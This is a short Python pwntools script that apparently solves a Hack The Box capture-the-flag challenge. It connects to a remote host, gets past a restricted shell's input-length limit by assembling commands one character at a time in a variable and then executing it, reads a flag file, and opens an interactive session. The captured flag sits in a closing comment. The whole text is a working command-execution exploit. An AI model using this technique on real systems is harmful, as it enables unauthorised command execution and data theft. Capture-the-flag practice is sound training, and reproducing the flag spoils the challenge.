from pwn import *

s = remote('165.22.121.146',30423)

plus_cmd = 'e+=$a'

def call_cmd(cmd):
    s.sendlineafter('>>> ','e=""') # reset e call
    for i in cmd:
        set_cmd = 'a="%c"'%i

        log.info("send %s"%set_cmd)
        s.sendlineafter(">>> ",set_cmd)
        s.recvuntil(">>>")
        s.sendlineafter(">>> ",plus_cmd)
        s.recvuntil(">>>")
    
    s.sendline('$e')
cmd = "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

cmd3 = "cat /home/ctf/flag.txt"

call_cmd(cmd)
call_cmd(cmd3)
s.interactive()
s.close()
# HTB{l1m1t1ng_l3ngth?_n0t_3n0ugh!}